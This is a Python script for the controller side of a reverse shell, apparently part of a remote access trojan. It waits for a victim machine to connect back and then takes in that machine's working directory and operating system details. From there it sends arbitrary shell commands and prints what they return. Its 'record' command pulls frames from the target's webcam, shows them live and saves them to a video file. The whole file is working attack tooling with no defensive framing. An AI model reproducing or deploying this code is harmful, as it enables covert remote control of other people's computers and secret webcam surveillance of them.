import socket, threading, signal, cv2, numpy as np

# Server setup
h, p, b, sep = "127.0.0.1", 4000, 1024*128, "<~>"
srv = socket.socket()
srv.bind((h, p))
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.listen(5)
print(f"Listening on {h}:{p} ...")

conn, addr = srv.accept()
print(f"{addr[0]}:{addr[1]} Connected!")

# Handshake: receive working directory and OS info
loc = conn.recv(b).decode()
sysinfo = conn.recv(b).decode()
print(f"[+] CWD: {loc}\n[+] OS: {sysinfo}")

cam, out, t = None, None, None

def exit_gracefully(sig, frm):
    print('Closing connection...')
    if t: t.join()
    if cam: cam.release()
    if out: out.release()
    cv2.destroyAllWindows()
    conn.close(); srv.close()
    exit(0)

signal.signal(signal.SIGINT, exit_gracefully)

# Video handling function
def vcap():
    global out
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    out = cv2.VideoWriter('output.mp4', fourcc, 30.0, (640, 480))
    while True:
        f_size = int.from_bytes(conn.recv(4), 'little')
        f_data = b''
        while len(f_data) < f_size:
            pkt = conn.recv(min(b, f_size - len(f_data)))
            if not pkt: break
            f_data += pkt
        if not f_data: break
        frame = cv2.imdecode(np.frombuffer(f_data, np.uint8), cv2.IMREAD_COLOR)
        out.write(frame)
        cv2.imshow('Remote Feed', frame)
        if cv2.waitKey(1) & 0xFF == ord('q'): break
    out.release(); cv2.destroyAllWindows()

# Command loop (reverse shell interaction)
while True:
    cmd = input(f"{loc} $> ").strip()
    if not cmd: continue
    
    conn.send(cmd.encode())  # Send command to the client

    if cmd.lower() == "exit":
        break
    elif cmd.lower() == "record":  # Start video recording on the target
        t = threading.Thread(target=vcap)
        t.start()
        print("Video capture started.")
    else:
        # Receive command output and handle CWD changes
        output = conn.recv(b).decode()
        res, loc = output.split(sep)
        print(res)

if t: t.join()
conn.close(); srv.close()
